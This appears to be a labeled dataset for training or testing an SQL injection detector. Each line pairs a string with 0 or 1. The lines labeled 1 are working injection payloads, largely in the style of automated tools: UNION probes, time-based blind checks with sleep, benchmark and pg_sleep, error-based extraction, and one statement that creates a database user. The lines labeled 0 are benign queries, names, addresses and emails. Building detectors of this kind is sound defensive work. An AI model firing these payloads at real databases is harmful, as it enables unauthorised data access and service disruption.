1' and 7528  =  2894 and 'qoyw'  =  'qoyw;1
"UPDATE orders SET name = '2023-01-01' WHERE quantity = 'active';";0
bl!teo;0
lores bigas;0
'-';1
c/ costa verde, 100 4c;0
SELECT * FROM accurate WHERE camp BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT * FROM  ( SELECT other FROM saddle ) ;0
SELECT * FROM train WHERE sometime = 'flag'  OR circle = 'battle';0
SELECT * FROM immediately FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM together;0
SELECT MIN ( party )  AS writing FROM verb;0
"-8034"" or 8571  =  8571--";1
benchmark(10000000,MD5(1))#;1
sobrestante;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#;1
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg;1
SELECT * FROM blind WHERE order NOT LIKE 'century%';0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i;1
"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs";1
du-tuan;0
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw;1
4ode5ista;0
"SELECT user_id, price FROM customers WHERE email = 'john@example.com';";0
27113;0
newtell@theroxyblue.ir;0
massimil;0
1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505;1
SELECT * FROM burst WHERE voyage = 'period'  OR sign = 'poetry';0
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk";1
julin;0
SELECT MIN ( stared )  AS substance FROM easier;0
SELECT city ( s )  FROM involved FULL OUTER JOIN;0
barranc de la torrentera, 56, 13?c;0
weld@yiutuve.vc;0
willingham@necesitocurro.mq;0
INSERT INTO remove ( scale, facing, troops, select, he, grabbed )  VALUES  ( 'press', 'wind'. space', 'slow', 'alone', 'throughout', 'visit' )  ;0
b3r3al;0
-3921'  )   as audo where 7087  =  7087 or 1755  =  4937--;1
SELECT every FROM directly UNION ALL SELECT merely FROM indeed ORDER BY furniture;0
1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #;1
boget brufau;0
18517;0
69663934q;0
-1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#;1
1  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ;1
SELECT * FROM place WHERE shape = 'opposite'  OR charge = 'jump';0
pilocarpina;0
1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --;1
"1%""   )    )    union all select null#";1
SELECT TOP 3 * FROM jungle WHERE plan = 'stiff' SELECT * FROM positive;0
select case when 6420  =  7941 then 1 else null end--;1
propaganda;0
SELECT Employees.column, COUNT ( Orders.stickID )  AS seeFROM    ( OrdersINNER JOIN leader ON Orders.winID  =  Employees.silenceID ) ;0
"1"" where 7631  =  7631 and 4733  =  3439";1
galileo, 76, 6-a;0
cabral_crowther@frioelectric.br;0
"1""  )   where 4112  =  4112";1
SELECT foot FROM uncle UNION SELECT given FROM tales ORDER BY out;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--;1
2952;0
yamasaki@multaspendientes.eg;0
-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609--;1
SELECT * FROM notice WHERE exact BETWEEN '1996-07-01' AND '1996-07-31';0
-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa;1
1'+  (  select idnb where 2338  =  2338;1
"1"" where 4183  =  4183 union all select null,null,null,null,null,null--";1
SELECT fightingID AS ID, fire AS constantly FROM come;0
HAVING 1=0#;1
SELECT * FROM father WHERE related BETWEEN have09/01/1996or AND seed15/31/1996chicken;0
"1"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --";1
46844;0
22880;0
SELECT * FROM pet WHERE piece NOT LIKE 'purpose%';0
SELECT AVG ( changing ) FROM smoke SELECT SUM ( enough ) ;0
-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--;1
SELECT * FROM average ORDER BY sure, find;0
"1""   )    )    as duny where 3756  =  3756 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --";1
1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --;1
7u4o84z1m07459;0
hana;0
1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
minas de riotinto;0
SELECT * FROM grandfather WHERE beneath NOT BETWEEN 'began' AND 'ants';0
"1%""   )    )    union all select null,null,null,null#";1
16154;0
"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #";1
cami son anglada, s/n;0
1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh;1
-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#;1
SELECT Count ( * )  AS familiar;0
ORDER BY 4;1
or   (  EXISTS  ) ;1
"1%""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """;1
SELECT * FROM remove ORDER BY knowledge, yellow;0
SELECT * FROM moon 3;0
select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1;1
0o380ado6;0
SELECT * FROM taste WHERE until = 'heading' FETCH FIRST 3 ROWS ONLY;0
SELECT chest ( s )  FROM line UNION;0
1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  '%'  =  ';1
select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1';1
"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #";1
-6757'   )    )     )   or 4524  =  3696;1
6$ng4tado;0
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm;1
bowman pinela;0
-7772'   )    )    or 9323  =  9323#;1
mohandas;0
-7941 or   (  5822  =  8754  )  *8754-- eepn;1
petrie3@menorca.com.kp;0
SELECT sing ( s )  FROM engineer FULL OUTER JOIN;0
select * from users where id  =  1 union select 1||@,version  (    )   -- 1;1
SELECT TOP 3 * FROM perfectly;0
6173;0
SELECT AVG ( system ) FROM fix SELECT SUM ( dull ) ;0
1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
SELECT * FROM  ( SELECT life FROM probably ) ;0
SELECT individual ( s )  FROM just SELECT pay FROM loose;0
select sleep  (  5  )  -- hlgt;1
"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#";1
SELECT * FROM dollar WHERE right NOT IN  ( 'inside', 'dear', 'melted' )  ;0
1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #;1
1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --;1
"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --";1
SELECT * FROM garden  WHERE tide = writing;0
castelln;0
SELECT AVG ( Price ) FROM cap;0
"1%"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """;1
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   5171  =  5171;1
itziar;0
SELECT * FROM radio ORDER BY anyway DESC;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--;1
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ";1
SELECT * FROM read WHERE NOT high = 'cowboy'  AND NOT water = 'wore';0
8en7dill3;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--;1
"1""   )    )    as sqow where 8752  =  8752";1
"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """;1
SELECT COUNT ( action )  FROM title;0
-6637'   )    )    order by 1#;1
"DELETE FROM employees WHERE price = 'Sample text';";0
"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """;1
-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--;1
"1""  )   order by 1--";1
-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--;1
" select * from users where id  =  1 or "".;"" or 1  =  1 -- 1";1
fergus;0
1'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
SELECT COUNT ( rain )  FROM question;0
tonkovic;0
1' where 2673  =  2673;1
select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--;1
abraham;0
1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
-4305   )    )     )   union all select 2401,2401--;1
SELECT * FROM disease WHERE establish LIKE '%alike%';0
SELECT writer FROM party UNION ALL SELECT truth FROM upon ORDER BY train;0
"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--";1
SELECT MIN ( over )  AS rate FROM finger;0
26527823z;0
1,31E+15;0
SELECT AVG ( solution ) FROM spell SELECT SUM ( addition ) ;0
( ;1
"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#";1
c/ grabador david roberts 154 1-h;0
SELECT * FROM compound WHERE little = 'itself' FETCH FIRST 3 ROWS ONLY;0
select   (  case when   (  5390  =  7419  )   then 5390 else 5390*  (  select 5390 from mysql.db  )   end  )  #;1
"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """;1
calle ter, 20,;0
1 order by 1#;1
"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--";1
(  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ;1
SELECT * FROM piece WHERE twelve = 'ship'  AND City = 'excellent';0
1,21E+14;0
SELECT dangerous ( s )  FROM grade UNION;0
1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi;1
"1"" where 3080  =  3080 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --";1
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1";1
desmerecer;0
1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
SELECT MIN ( repeat )  AS chemical FROM rain;0
1  )   where 8320  =  8320 waitfor delay '0:0:5'--;1
"-2289""  )   or 8624  =  6279 and   (  ""ised""  =  ""ised";1
pedrosas, las;0
SELECT Employees.wide, COUNT ( Orders.alreadyID )  AS spiteFROM    ( OrdersINNER JOIN away ON Orders.wireID  =  Employees.contrastID ) ;0
UPDATE broad SET moving =  'spin', City =  'mixture' WHERE corn =  which;0
calle valencia de don juan 161, 7?d;0
"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#";1
de la cerda gassol;0
SELECT troops ( s )  FROM nation SELECT blue FROM wise;0
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""vukd""  =  ""vukd";1
"-6116""   )    )    union all select 3679,3679,3679,3679,3679,3679,3679--";1
FROM  ( SELECT DISTINCT mountain FROM uncle ) ;0
arajol lo cascio;0
SELECT * FROM public ORDER BY rising ASC, foot DESC;0
SELECT TOP 3 * FROM before;0
ibazeta montells;0
"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""rkfk"" like ""rkfk";1
"1%""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""%""  =  """;1
"SELECT description, status, created_at, user_id FROM products WHERE id = '2023-01-01';";0
reto8sivo;0
-7426' order by 1#;1
san miguel del pino;0
1   )    )    and 7533  =  7533 and    (    (   8738  =  8738;1
SELECT high ( s )  FROM snake UNION ALL;0
SELECT * FROM what WHERE by = 'quarter';0
bello.sandor@hipergipuzkoa.to;0
1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nelb'  =  'nelb;1
1  )   where 1333  =  1333 order by 1--;1
"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--";1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'gpax'  =  'gpax;1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  ';1
50200;0
"create user name identified by pass123 temporary tablespace temp default tablespace users;";1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd";1
SELECT * FROM salt WHERE NOT stage = 'examine'  AND NOT day = 'alphabet';0
"-6731"" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166--";1
abaeto sanchon;0
03nte99era;0
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs;1
"-4541""   )    )    or make_set  (  4821  =  5233,5233  )   and    (    (   ""xfex""  =  ""xfex";1
OR x=x;1
select   (  case when   (  3681  =  5026  )   then 3681 else 3681*  (  select 3681 from information_schema.character_sets  )   end  )  #;1
SELECT * FROM arrangement WHERE return BETWEEN certain09/01/1996four AND chart15/31/1996party;0
en9r195d9;0
1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ;1
c8nde9a;0
1%'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  ';1
azema.alvir@telogis.gf;0
25769;0
-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#;1
SELECT AVG ( cow ) FROM born;0
AND 1=1;1
SELECT * FROM beauty ORDER BY course DESC;0
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""zptu""  =  ""zptu";1
1   )    )    union all select null,null,null,null,null,null,null--;1
-7950 where 9619  =  9619 union all select 9619,9619,9619,9619--;1
SELECT * FROM have WHERE egg BETWEEN '1996-07-01' AND '1996-07-31';0
"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--";1
SELECT * FROM truth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM hall;0
1pergamin0da;0
1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ;1
dean;0
-3873%'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
SELECT Orders.automobilerID, Employees.pure, Employees.just FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fastID ORDER BY Orders.richID;0
1   )    )    or sleep  (  __TIME__  )  #;1
"1"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #";1
langellotti;0
SELECT AVG ( journey ) FROM orange SELECT SUM ( farm ) ;0
SELECT * FROM neck WHERE properly = 'struck' LIMIT 3;0
1   )    )     )   union all select null,null,null,null,null,null,null,null#;1
SELECT TOP 3 * FROM somehow SELECT * FROM weather 3SELECT * FROM impossible;0
1'+  (  select 'mxlb' where 4900  =  4900;1
2,82E+15;0
select * from users where id  =  1 +   (  .  )   or 1  =  1 -- 1;1
"1""   )    )    as phis where 4420  =  4420 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
SELECT * FROM steep 3 SELECT * FROM dangerous;0
1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139;1
tracisto arroyave;0
FROM  ( SELECT DISTINCT hill FROM large ) ;0
-1 UNION SELECT 1 INTO @,@,@;1
torrescrcela;0
SELECT attention ( s )  FROM trunk UNION;0
1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
DELETE FROM dead WHERE rabbit = 'jump';0
-7418 union all select 1340,1340,1340,1340,1340#;1
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --;1
"1""  )   where 7753  =  7753";1
"-1235""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""ahhz"" like ""ahhz";1
SELECT MIN ( occur )  AS fastened FROM arrange;0
SELECT * FROM reason FETCH FIRST 3 ROWS ONLY;0
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1";1
SELECT * FROM volume WHERE who = 'paint'  AND  ( good = 'discover' OR bigger = 'tired' ) ;0
SELECT * FROM general 3;0
23215;0
"x' and userid is NULL; --";1
1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof;1
SELECT * FROM sit;0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
mahecha barguo;0
d37t30;0
-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ';1
UPDATE individual SET one = 'instance'WHERE dish = 'gift';0
SELECT stood ( s )  FROM pipe UNION;0
select * from users where id  =  1 *. union select null,@@VERSION -- 1;1
"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
sevilla;0
SELECT climbID AS ID, think AS weight FROM talk;0
""" or 1  =  1--";1
"-2643%"" union all select 7779,7779--";1
select * from users where id  =  '1' union select .#,@@VERSION -- 1';1
select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1;1
SELECT AVG ( Price ) FROM carried;0
1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz;1
SELECT separate,this FROM gone WHERE island = 'zero' UNION SELECT promised, block FROM disappear;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#;1
vadell comalada;0
SELECT COUNT ( cloud ) FROM already;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--;1
UPDATE solve SET load =  'trick', City =  'sense' WHERE citizen =  contain;0
"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--";1
SELECT * FROM danger ORDER BY wealth;0
-9557  )   where 2891  =  2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--;1
"-8005""  )   union all select 5213,5213,5213,5213,5213--";1
SELECT * FROM remarkable WHERE army = 'face'  AND City = 'massage';0
"INSERT INTO employees (price, user_id, quantity, email) VALUES (456, 'active', 'active', 'user123');";0
SELECT * FROM drove WHERE dark NOT IN  ( 'younger', 'swung', 'term' )  ;0
SELECT COUNT ( DISTINCT kitchen )  FROM tired;0
"1""   )    )   ";1
"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--";1
SELECT dinnerID AS ID, stranger AS language FROM heavy;0
end# thjv;1
c/ mare de deu de fatima, 165;0
SELECT COUNT ( about ) , sunlight FROM anywhere BY together;0
taghizad;0
19392;0
SELECT * FROM garden WHERE bear NOT LIKE '[hill]%';0
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --;1
1%'   )    )    order by 1--;1
lleida;0
-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#;1
"1""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xqlh""  =  ""xqlh";1
SELECT TOP 3 * FROM been;0
merida@elsentidodelavida.nc;0
1   )    )    as zdbj where 2300  =  2300   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --;1
-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#;1
1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
SELECT * FROM difference 3 SELECT * FROM snow;0
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1;1
"-6014"" or make_set  (  3003  =  2609,2609  )  ";1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--;1
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """;1
1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  ';1
SELECT DISTINCT free FROM them;0
7497;0
7106;0
SELECT * FROM silent WHERE cover IN  ( SELECT bet FROM bet ) ;0
1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--;1
SELECT engine FROM began UNION ALL SELECT jet FROM chamber ORDER BY log;0
"DELETE FROM inventory WHERE email = 'active';";0
c/ torre, 23;0
1  )   and elt  (  3138  =  1817,1817  )  ;1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep";1
